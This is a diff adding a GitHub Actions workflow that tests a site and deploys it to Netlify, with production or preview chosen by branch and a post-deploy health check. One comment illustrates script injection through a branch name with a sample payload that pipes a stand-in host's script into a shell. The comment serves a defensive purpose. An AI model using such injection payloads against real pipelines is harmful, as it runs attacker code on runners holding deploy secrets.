@@ -1,0 +1,108 @@
+# Deploys the site to Netlify.
+#
+# The deploy runs here rather than from a developer's machine because a
+# GitHub runner can reach the Netlify API, and because the token then lives
+# in one place — repository secrets — instead of on several laptops.
+#
+# Required repository secrets (Settings → Secrets and variables → Actions):
+#
+#   NETLIFY_AUTH_TOKEN   a personal access token, from
+#                        app.netlify.com → User settings → Applications
+#   NETLIFY_SITE_ID      the site's API ID, from
+#                        Site configuration → General → Site information
+#
+# The *application's* own variables — TRACKER_API_KEY, TURSO_DATABASE_URL,
+# TURSO_AUTH_TOKEN, GARAGE_ID — are deliberately not set here. They belong to
+# the site, not to the build: the function reads them at request time, long
+# after this workflow has finished. Set them once in the Netlify UI, or with
+# `npx netlify env:import .env`, as the README describes.
+
+name: Deploy
+
+on:
+  push:
+  workflow_dispatch:
+
+# A newer push to the same branch makes the one in flight irrelevant. Let it
+# go rather than racing it to the same deploy slot.
+concurrency:
+  group: deploy-${{ github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+
+    # Nothing here writes to the repository; it only talks to Netlify.
+    permissions:
+      contents: read
+
+    steps:
+      - uses: actions/checkout@v4
+
+      # netlify.toml pins NODE_VERSION 22 for the Netlify build; matching it
+      # here keeps the two builds honest. netlify-cli itself wants >=22.13.
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+          cache: npm
+
+      - name: Install dependencies
+        run: npm ci
+
+      # The gate. `netlify deploy --build` runs `npm run build`, which
+      # typechecks, so the thing worth adding in front of it is the suite.
+      # A red test never becomes a deploy.
+      - name: Run tests
+        run: npm test
+
+      # Whether this is the real thing or a preview is decided by the branch,
+      # not by a hardcoded name: only the repository's default branch goes to
+      # production. Every other branch still deploys, to its own preview URL,
+      # which is the cheapest way to look at a change before merging it.
+      - name: Deploy to Netlify
+        # Every value the script reads arrives through `env`, never through
+        # `${{ }}` inside the shell. A branch name is attacker-controlled text,
+        # and pasting it straight into a command is how a branch called
+        # `; curl evil.sh | sh; #` would run on the runner.
+        env:
+          NETLIFY_AUTH_TOKEN: ${{ secrets.NETLIFY_AUTH_TOKEN }}
+          NETLIFY_SITE_ID: ${{ secrets.NETLIFY_SITE_ID }}
+          REF_NAME: ${{ github.ref_name }}
+          DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}
+          SHA: ${{ github.sha }}
+        run: |
+          set -euo pipefail
+
+          # Without these the CLI fails several steps later with "No teams
+          # available", which describes the symptom and not the cause. Say
+          # the useful thing instead, and fail rather than skipping: a deploy
+          # that quietly does nothing is worse than a red build.
+          if [ -z "${NETLIFY_AUTH_TOKEN:-}" ] || [ -z "${NETLIFY_SITE_ID:-}" ]; then
+            echo "::error::NETLIFY_AUTH_TOKEN and NETLIFY_SITE_ID are not set."
+            echo "Add them under Settings -> Secrets and variables -> Actions."
+            echo "See README, 'Deploying from CI', for where to find each one."
+            exit 1
+          fi
+
+          # --json makes the CLI print the deploy's URLs as a JSON object
+          # after the build output. Keeping the whole stream lets the log
+          # stay readable while the next step still has somewhere to read
+          # the address from.
+          if [ "$REF_NAME" = "$DEFAULT_BRANCH" ]; then
+            echo "Deploying $SHA to production"
+            npx --yes netlify-cli@27 deploy --build --prod \
+              --message "$SHA" --json | tee deploy-output.txt
+          else
+            echo "Deploying $SHA to a preview URL"
+            npx --yes netlify-cli@27 deploy --build \
+              --message "$REF_NAME @ $SHA" --json | tee deploy-output.txt
+          fi
+
+      # Uploading files is not the same as having a working site. The site's
+      # own variables are set in the Netlify UI rather than here, so the way
+      # this deploy fails is a site that serves the app and an API that
+      # refuses every request — which looks fine until someone opens it.
+      # This asks the deployed URL what state it is actually in.
+      - name: Check the deploy is serving
+        run: node scripts/check-deploy.mjs --from deploy-output.txt
